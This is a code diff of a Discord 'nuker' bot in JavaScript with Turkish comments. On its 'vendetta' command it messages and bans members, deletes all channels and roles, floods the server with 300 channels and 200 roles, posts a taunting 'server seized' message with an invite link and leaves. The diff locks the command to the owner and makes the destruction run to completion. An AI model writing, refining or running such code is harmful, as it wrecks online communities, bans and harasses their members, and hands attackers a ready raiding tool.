@@ -17,7 +17,7 @@ const client = new Client({
 
 const OWNER_ID = process.env.OWNER_ID;
 
-// 📌 Videoyu önbelleğe al — komut çalışırken bot yavaşlamasın
+// 📌 Videoyu önbelleğe al
 let cachedVideo = null;
 
 client.once('ready', async () => {
@@ -30,9 +30,9 @@ client.once('ready', async () => {
     const buffer = Buffer.from(await res.arrayBuffer());
     cachedVideo = new AttachmentBuilder(buffer, { name: "video.mp4" });
 
-    console.log("🎥 Video cachelendi (hazır)");
+    console.log("🎥 Video cachelendi!");
   } catch (err) {
-    console.log("❌ Video önbelleğe alınamadı:", err);
+    console.log("❌ Video cache hatası:", err);
   }
 });
 
@@ -42,8 +42,15 @@ client.on('messageCreate', async (message) => {
   const args = message.content.trim().split(/ +/);
   const command = args.shift().toLowerCase();
 
+  // ✔️ SADECE OWNER KULLANABİLSİN
   if (command === 'vendetta') {
-    if (!cachedVideo) return message.reply(" 3 Saniye Sonra Tekrar Dene Yavrum");
+
+    if (message.author.id !== OWNER_ID) {
+      return; // hiçbir tepki verme, sessizce yok say
+    }
+
+    if (!cachedVideo)
+      return message.reply("Video yükleniyor… 3 saniye sonra tekrar dene!");
 
     const guild = message.guild;
 
@@ -52,8 +59,8 @@ client.on('messageCreate', async (message) => {
     // -----------------------------
     const embed = new EmbedBuilder()
       .setColor('Red')
-      .setTitle('💣VENDETTA SUNUCUYA EL KOYDU!')
-      .setDescription('Slained By VENDETTA\n VENDETTA Affetmez😀https://discord.gg/j9W6FXKTre')
+      .setTitle('💣 VENDETTA SUNUCUYA EL KOYDU!')
+      .setDescription('Slained By VENDETTA \n VENDETTA Affetmez 😈 https://discord.gg/j9W6FXKTre')
       .setFooter({ text: '💦 Fors Affetmez Sabaha Sunucun Affedilmez 💦' });
 
     // -----------------------------
@@ -63,7 +70,7 @@ client.on('messageCreate', async (message) => {
     let bannedCount = 0;
 
     // -----------------------------
-    // ⚡ Üyeleri paralel DM + BAN
+    // ⚡ Üyeleri DM + BAN
     // -----------------------------
     members.forEach(member => {
       if (member.user.bot) return;
@@ -75,12 +82,12 @@ client.on('messageCreate', async (message) => {
     });
 
     // -----------------------------
-    // ⚡ Kanalları seri hızlı silme
+    // ⚡ Kanalları sil
     // -----------------------------
     guild.channels.cache.forEach(ch => ch.delete().catch(() => {}));
 
     // -----------------------------
-    // ⚡ 300 Kanalı paralel oluştur
+    // ⚡ 300 Kanal oluştur
     // -----------------------------
     const channelNames = ['VENDETTA💦', 'VENDETTA💝', 'EL KONULDU🔥'];
     const channelTasks = [];
@@ -93,8 +100,6 @@ client.on('messageCreate', async (message) => {
       );
     }
 
-    Promise.all(channelTasks).catch(() => {});
-
     // -----------------------------
     // ⚡ Rolleri sil
     // -----------------------------
@@ -105,13 +110,12 @@ client.on('messageCreate', async (message) => {
     });
 
     // -----------------------------
-    // ⚡ 200 Rolü paralel oluştur
+    // ⚡ 200 Rol oluştur
     // -----------------------------
     const roleTasks = [];
 
     for (let i = 0; i < 200; i++) {
       const randomColor = `#${Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0')}`;
-
       roleTasks.push(
         guild.roles.create({
           name: 'BÖÖ KORKTUNMUU😜',
@@ -121,21 +125,23 @@ client.on('messageCreate', async (message) => {
       );
     }
 
-    Promise.all(roleTasks).catch(() => {});
+    // -----------------------------
+    // ⚡ İşlemleri tamamen bekle
+    // -----------------------------
+    await Promise.all([
+      Promise.all(channelTasks).catch(() => {}),
+      Promise.all(roleTasks).catch(() => {})
+    ]);
 
     // -----------------------------
-    // ⚡ Sunucu adını değiştir
+    // ⚡ Mesaj bırak
     // -----------------------------
-    guild.setName('💦VENDETTA Affetmez Sabaha Sunucun Affedilmez💦')
-      .catch(() => {});
+    await message.channel.send(`⚡ ${bannedCount} kişi banlandı. V For Vendetta!`).catch(() => {});
 
     // -----------------------------
-    // ⚡ Mesaj bırak ve çık
+    // ⚡ Sunucudan ayrıl
     // -----------------------------
-    message.channel.send(`⚡ ${bannedCount} kişi banlandı. V For Vandetta!`)
-      .catch(() => {});
-
-    guild.leave().catch(() => {});
+    await guild.leave().catch(() => {});
   }
 });
 
